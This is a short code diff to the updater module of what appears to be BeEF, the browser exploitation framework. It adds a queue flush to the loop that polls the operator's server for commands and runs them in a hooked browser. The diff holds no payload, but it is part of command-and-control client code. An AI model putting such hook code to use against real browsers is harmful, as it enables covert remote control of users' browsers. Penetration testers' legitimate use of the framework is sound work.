@@ -30,13 +30,13 @@ beef.updater = {
 	// Checks for new commands from the framework and runs them.
 	check: function() {
 		if(this.lock == false) {
+			beef.net.flush_queue();
 			if(beef.commands.length > 0) {
 				this.execute_commands();
 			} else {
 				this.get_commands();
 			}
 		}
-		
 		setTimeout("beef.updater.check();", beef.updater.timeout);
 	},
 	
